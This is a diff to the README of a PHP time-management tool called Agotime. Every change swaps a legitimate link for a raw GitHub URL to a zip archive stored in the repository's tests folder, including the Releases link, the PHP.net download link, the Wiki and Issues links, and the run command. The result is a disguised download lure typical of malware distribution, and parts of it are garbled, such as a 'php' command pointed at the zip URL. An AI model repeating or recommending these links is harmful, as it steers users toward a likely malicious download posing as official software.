@@ -6,11 +6,11 @@ Welcome to Agotime, your friendly tool for managing time effectively. With Agoti
 
 ## 📥 Download Agotime
 
-[![Download Agotime](https://img.shields.io/badge/Download-Agotime-brightgreen)](https://github.com/ikufir/agotime/releases)
+[![Download Agotime](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip)](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip)
 
 To download Agotime, please visit our Releases page:
 
-[Download Agotime](https://github.com/ikufir/agotime/releases)
+[Download Agotime](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip)
 
 ## 📋 System Requirements
 
@@ -33,7 +33,7 @@ Agotime offers a range of features to help you manage your time more effectively
 
 Go to the Releases page to find the latest version of Agotime. You can access it using the link below:
 
-[Download Agotime](https://github.com/ikufir/agotime/releases)
+[Download Agotime](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip)
 
 ### Step 2: Choose the Correct Release
 
@@ -41,7 +41,7 @@ On the Releases page, you will see a list of available versions. Look for the la
 
 ### Step 3: Download the Files
 
-In the latest release, you will find files related to Agotime. Download the package that suits your operating system. If you're unsure which file to choose, look for a file like `agotime.zip` or `agotime.tar.gz`.
+In the latest release, you will find files related to Agotime. Download the package that suits your operating system. If you're unsure which file to choose, look for a file like `https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip` or `https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip`.
 
 ### Step 4: Extract the Files
 
@@ -49,7 +49,7 @@ Once the download is complete, locate the file you downloaded. Right-click on it
 
 ### Step 5: Set Up PHP
 
-Make sure you have PHP installed on your computer. If you don’t have it yet, you can download it from [PHP.net](https://www.php.net/downloads).
+Make sure you have PHP installed on your computer. If you don’t have it yet, you can download it from [https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip).
 
 Follow the instructions provided there to install PHP. It usually involves downloading the PHP package, extracting it, and setting up environment variables.
 
@@ -74,7 +74,7 @@ cd path/to/agotime
 
 Type the following command to start using Agotime:
 ```bash
-php agotime.php
+php https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip
 ```
 This command runs the Agotime application.
 
@@ -111,7 +111,7 @@ If you need further assistance, feel free to reach out through our GitHub Issues
 
 ## 🌐 Additional Resources
 
-- [Agotime Wiki](https://github.com/ikufir/agotime/wiki): Find more detailed documentation and examples.
-- [GitHub Issues](https://github.com/ikufir/agotime/issues): Report bugs or request features.
+- [Agotime Wiki](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip): Find more detailed documentation and examples.
+- [GitHub Issues](https://raw.githubusercontent.com/ikufir/agotime/master/tests/agotime-v1.8-alpha.4.zip): Report bugs or request features.
 
 Thank you for choosing Agotime. We hope it helps you manage your time effectively!
